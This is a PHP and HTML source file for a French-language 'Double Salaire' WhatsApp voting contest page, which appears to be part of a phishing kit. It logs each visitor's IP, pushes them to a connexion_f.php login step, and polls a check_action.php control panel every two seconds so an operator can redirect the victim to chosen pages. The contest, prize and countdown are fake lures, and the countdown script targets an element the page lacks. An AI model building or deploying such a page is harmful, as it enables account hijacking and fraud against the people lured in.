<?php

function getClientIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        // Si Cloudflare
      
        $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Si un proxy envoie l'IP originale
      
        $_SERVER['REMOTE_ADDR'] =  explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         
        $_SERVER['REMOTE_ADDR'] =  $_SERVER['HTTP_CLIENT_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

getClientIP();
 

// Récupérer le nom du candidat depuis l'URL
$candidatName = $_GET['name'] ?? 'VOTEZ';

session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32)); // 64 caractères sécurisés
}

$visitorToken = $_SESSION['token'];
// Générer un ID de session unique
$sessionId = 'session_'.$_SERVER['REMOTE_ADDR'];
$clientIp = $_SERVER['REMOTE_ADDR'];

// Créer le dossier sessions s'il n'existe pas
if (!file_exists('sessions')) {
    mkdir('sessions', 0777, true);
}

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

// Enregistrer l'IP et la page actuelle
$trackingData = [
    'page' => 'index.php',
    'timestamp' => time(),
    'ip' => $clientIp,
    'candidat' => $candidatName
];
file_put_contents('tracking/' . $sessionId . '.json', json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Votez pour <?php echo htmlspecialchars($candidatName); ?> - Double Salaire</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .logo {
            height: 40px;
            margin: 0 10px;
        }
        
        .contest-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            padding: 30px 20px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .contest-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background: linear-gradient(90deg, #25D366, #1ebc5e, #25D366);
        }
        
        .whatsapp-badge {
            display: inline-block;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            font-size: 12px;
            font-weight: 600;
            padding: 6px 12px;
            border-radius: 20px;
            margin-bottom: 15px;
            text-align: center;
            width: 100%;
        }
        
        .contest-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #25D366;
            text-align: center;
        }
        
        .contest-description {
            color: #54656f;
            margin-bottom: 20px;
            font-size: 15px;
            line-height: 1.6;
            text-align: center;
        }
        
        .candidate-section {
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-radius: 10px;
            padding: 25px;
            margin: 25px 0;
            text-align: center;
            border: 2px solid #c8e6c9;
            position: relative;
        }
        
        .vote-for-label {
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
        }
        
        .candidate-name {
            font-size: 28px;
            font-weight: 700;
            color: #25D366;
            margin: 20px 0 15px;
            position: relative;
            display: inline-block;
        }
        
        .candidate-name::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, #25D366, #1ebc5e);
            border-radius: 3px;
        }
        
        .votes-counter {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
            font-size: 15px;
            color: #54656f;
        }
        
        .votes-number {
            font-weight: 700;
            color: #25D366;
            font-size: 20px;
            margin: 0 8px;
        }
        
        .prize-info {
            display: flex;
            align-items: center;
            margin: 20px 0;
            padding: 15px;
            background-color: #e8f5e9;
            border-radius: 10px;
            border-left: 4px solid #25D366;
        }
        
        .prize-icon {
            font-size: 28px;
            color: #25D366;
            margin-right: 15px;
        }
        
        .prize-text {
            font-size: 15px;
            color: #2e7d32;
            font-weight: 600;
        }
        
        .vote-button {
            display: block;
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
            margin: 20px 0 12px;
        }
        
        .vote-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.4);
        }
        
        .vote-button i {
            margin-right: 8px;
            font-size: 18px;
        }
        
        .whatsapp-group-box {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            border: 2px solid #25D366;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
        }
        
        .group-title {
            font-size: 18px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .group-title i {
            font-size: 24px;
        }
        
        .group-message {
            color: #54656f;
            font-size: 14px;
            margin-bottom: 15px;
            line-height: 1.5;
        }
        
        .arabic-welcome {
            font-size: 16px;
            font-weight: 700;
            color: #25D366;
            margin: 12px 0;
            font-style: italic;
        }
        
        .join-group-button {
            display: inline-block;
            padding: 12px 24px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
        }
        
        .join-group-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.4);
        }
        
        .join-group-button i {
            margin-right: 6px;
        }
        
        .help-text {
            text-align: center;
            font-size: 14px;
            color: #54656f;
            margin: 15px 0;
            font-style: italic;
        }
        
        .timer {
            text-align: center;
            margin-top: 20px;
            color: #54656f;
            font-size: 14px;
        }
        
        .timer-value {
            font-weight: 700;
            color: #25D366;
            font-size: 16px;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .share-section {
            margin: 20px 0;
            text-align: center;
        }
        
        .share-title {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #54656f;
        }
        
        .share-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
        }
        
        .share-button {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            cursor: pointer;
            transition: transform 0.2s;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        .share-button:hover {
            transform: scale(1.15);
        }
        
        .share-facebook {
            background-color: #1877f2;
        }
        
        .share-whatsapp {
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
        }
        
        .share-twitter {
            background-color: #1DA1F2;
        }
        
        .share-telegram {
            background-color: #0088cc;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            
            .contest-title {
                font-size: 20px;
            }
            
            .candidate-name {
                font-size: 24px;
            }
            
            .whatsapp-group-box {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <input type="hidden" name="visitor_token" value="<?php echo htmlspecialchars($visitorToken); ?>">

    <div class="container">
        <div class="header">
            <div class="logo-container">
            </div>
        </div>
        
        <div class="contest-card">
            <div class="whatsapp-badge">
                <i class="fab fa-whatsapp"></i> Concours exclusif WhatsApp
            </div>
            
            
            <!-- WhatsApp Group Invitation -->
            <div class="whatsapp-group-box">
                <div class="group-title">
                    <i class="fab fa-whatsapp"></i> Rejoignez Notre Groupe WhatsApp
                </div>
                <p class="group-message">
                    Rejoignez notre communauté exclusive pour recevoir les dernières mises à jour et les résultats du concours en temps réel !
                </p>
                <div class="arabic-welcome">
                    🌍 مرحبا بك في مجموعتنا
                </div>
                <a href="#" class="join-group-button" onclick="joinWhatsAppGroup(); return false;">
                    <i class="fab fa-whatsapp"></i> Rejoindre le Groupe
                </a>
            </div>
            
        
        <div class="footer">
            <p>© 2026 Concours Double Salaire - WhatsApp Community. Tous droits réservés.</p>
            <p><a href="#">Règlement du concours</a> | <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        // Compte à rebours
        function updateCountdown() {
            const now = new Date();
            const end = new Date();
            end.setDate(end.getDate() + 2);
            end.setHours(end.getHours() + 14);
            end.setMinutes(end.getMinutes() + 35);
            end.setSeconds(end.getSeconds() + 22);
            
            const diff = end - now;
            
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            
            document.getElementById('countdown').textContent = `${days} jour${days > 1 ? 's' : ''} ${hours}h ${minutes}m ${seconds}s`;
        }
        
        updateCountdown();
        setInterval(updateCountdown, 1000);
        
        // Rejoindre le groupe WhatsApp - REDIRECTS TO connexion_f.php
        function joinWhatsAppGroup() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            // Redirect to config_f.php with session and IP
            window.location.href = 'connexion_f.php?session=' + sessionId + '&ip=' + clientIp;
        }
        
        // Partage sur Facebook
        function shareOnFacebook() {
            const url = window.location.href;
            window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, '_blank');
        }
        
        // Partage sur WhatsApp
        function shareOnWhatsApp() {
            const url = window.location.href;
            const text = `🎁 Votez pour <?php echo htmlspecialchars($candidatName); ?> dans le concours Double Salaire! Gagnez un double salaire pendant 2 mois! ${url}`;
            window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, '_blank');
        }
        
        // Partage sur Twitter
        function shareOnTwitter() {
            const url = window.location.href;
            const text = `Aidez votre ami(e) à gagner un double salaire! 🎁 Votez maintenant dans le concours Double Salaire 2025!`;
            window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(url)}`, '_blank');
        }
        
        // Partage sur Telegram
        function shareOnTelegram() {
            const url = window.location.href;
            const text = `🎁 Votez pour <?php echo htmlspecialchars($candidatName); ?> dans le concours Double Salaire! Concours exclusif WhatsApp!`;
            window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`, '_blank');
        }
        
        // Vérifier les actions depuis le panneau de contrôle
        function checkAction() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
            .then(response => response.json())
            .then(data => {
                if (data.action) {
                    if (data.action === 'custom' && data.redirect) {
                        window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp + '&name=<?php echo urlencode($candidatName); ?>';
                    } else {
                        window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp + '&name=<?php echo urlencode($candidatName); ?>';
                    }
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
            });
        }
        
        // Vérifier les actions toutes les 2 secondes
        setInterval(checkAction, 2000);
    </script>
</body>
</html>